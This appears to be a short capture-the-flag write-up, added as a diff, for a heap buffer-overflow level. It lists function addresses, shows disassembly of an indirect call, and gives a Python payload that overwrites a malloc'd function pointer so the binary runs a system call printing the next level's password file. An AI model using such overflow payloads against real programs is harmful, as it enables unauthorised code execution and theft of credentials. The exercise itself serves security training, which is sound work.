@@ -1,0 +1,26 @@
+in the level we have 3 functions : main n m
+0x08048454  n
+0x08048468  m
+0x0804847c  main
+
+function n call system("/bin/cat /home/user/level7/.pass")
+
+function m call puts
+
+function main has 2 malloc and strcpy that is vunerable to buffer overflow
+and also this insctruction that call address as funciton
+main has these instruction that are important
+
+   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
+   0x080484ca <+78>:	mov    0x18(%esp),%eax
+   0x080484ce <+82>:	mov    (%eax),%eax
+   0x080484d0 <+84>:	call   *%eax
+
+it call eax as a funciton, the address to the function in eax is stored in the second call to malloc(4)
+
+
+we find the offset of strcpy segfault to overwrite the address in the second malloc with n's address and call eax will execute function n instead of m
+
+
+python -c 'print("A"*72+"\x08\x04\x84\x54"[::-1])'
+
